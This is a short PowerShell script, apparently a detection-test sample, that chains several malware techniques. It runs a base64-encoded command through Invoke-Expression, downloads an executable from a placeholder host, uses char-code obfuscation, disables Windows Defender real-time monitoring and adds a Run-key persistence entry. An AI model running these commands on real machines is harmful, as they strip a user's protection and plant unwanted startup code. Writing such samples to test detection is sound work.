$cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aW52b2tlLUV4cHJlc3Npb24gIlNlY3VyZUNvbW1hbmQi"))
Invoke-Expression $cmd



$base64 = "aGVsbG8gd29ybGQh"
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64))
Write-Output $decoded
Invoke-WebRequest -Uri "http://safe-endpoint.test.com/benign" -OutFile "testfile.exe"
[char]72+[char]101+[char]108+[char]108+[char]111
Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TestPersistence" -Value "C:\Temp\testfile.exe"
